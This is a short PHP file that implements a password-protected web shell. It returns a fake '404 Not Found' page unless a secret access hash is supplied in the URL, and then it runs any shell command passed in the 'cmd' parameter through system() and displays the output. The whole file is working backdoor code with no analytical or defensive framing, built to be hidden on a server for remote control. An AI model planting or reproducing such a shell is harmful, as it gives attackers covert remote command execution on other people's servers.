<?php
$password = 'plo3ay'; 
$pass_hash = md5($password);

if (!isset($_GET['access']) || $_GET['access'] !== $pass_hash) {
    http_response_code(404);
    echo "<h1>404 Not Found</h1>";
    exit;
}

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<h3>Fake Shell Access Granted</h3>";
    echo "<form method='GET'>";
    echo "<input type='hidden' name='access' value='" . htmlspecialchars($pass_hash) . "'>";
    echo "<input type='text' name='cmd' placeholder='Enter command'>";
    echo "<input type='submit' value='Execute'>";
    echo "</form>";
}
?>
